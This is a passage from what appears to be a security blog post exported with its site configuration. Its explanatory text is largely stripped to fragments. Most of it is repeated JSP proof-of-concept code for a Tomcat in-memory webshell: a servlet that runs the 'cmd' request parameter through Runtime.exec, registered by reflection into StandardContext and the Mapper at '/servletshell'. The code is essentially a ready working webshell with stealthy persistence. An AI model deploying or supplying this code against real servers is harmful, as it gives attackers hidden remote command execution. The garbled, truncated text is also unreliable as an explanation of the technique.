appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    String servletName=&quot;ServletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    Servletshell shell=new Servletshell();</span><br><span class=\"line\">    //wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    //shellWrapper.addMapping(&quot;/servletshell&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //service</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //addWrapper</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>500wrapper</p>\n<p>wrapperwrapper <code>parent</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellWrapper.setParent(standardContext);</span><br></pre></td></tr></table></figure>\n\n<p>poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    String servletName=&quot;ServletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    Servletshell shell=new Servletshell();</span><br><span class=\"line\">    //wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    shellWrapper.setParent(standardContext);</span><br><span class=\"line\">    //shellWrapper.addMapping(&quot;/servletshell&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //service</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //addWrapper</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p></p>\n<p> addservletpoc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">      //wrapper</span><br><span class=\"line\">    Servletshell shell=new Servletshell()</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    shellWrapper.setParent(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //service</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //addWrapper</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>servlet</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>servletservletservlet</p>\n<p></p>\n<p><code>DefaultInstanceManager#newInstance</code>  <code>clazz</code> </p>\n<p> <code>clazz</code>  <code>StandardWrapper.servletClass</code> <code>StandardWrapperValve</code>  <code>context</code>  <code>StandardContext</code>  <code>children</code> </p>\n<p>wrapperservletservlet <code>StandardContext</code>  <code>addServlet</code> </p>\n<p><code>ApplicationContext</code> </p>\n<p> <code>createWrapper</code>  <code>servlet</code>  <code>addChild</code>  <code>children</code> servletdemo</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.io.Writer&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page import=<span class=\"string\">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Servletshell</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_ invoke__\">doGet</span>(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.<span class=\"title function_ invoke__\">getParameter</span>(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(cmd!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.<span class=\"title function_ invoke__\">getRuntime</span>().<span class=\"title function_ invoke__\">exec</span>(<span class=\"string\">&quot;cmd /c &quot;</span>+cmd).<span class=\"title function_ invoke__\">getInputStream</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>();</span><br><span class=\"line\">                byte[] b = <span class=\"keyword\">new</span> byte[<span class=\"number\">1024</span>];</span><br><span class=\"line\">                <span class=\"keyword\">int</span> a = -<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">while</span> ((a = in.<span class=\"title function_ invoke__\">read</span>(b)) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                    baos.<span class=\"title function_ invoke__\">write</span>(b, <span class=\"number\">0</span>, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.<span class=\"title function_ invoke__\">getWriter</span>();</span><br><span class=\"line\">                writer.<span class=\"title function_ invoke__\">write</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(baos.<span class=\"title function_ invoke__\">toByteArray</span>()));</span><br><span class=\"line\">                writer.<span class=\"title function_ invoke__\">flush</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_ invoke__\">doPost</span>(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.<span class=\"title function_ invoke__\">doPost</span>(req, 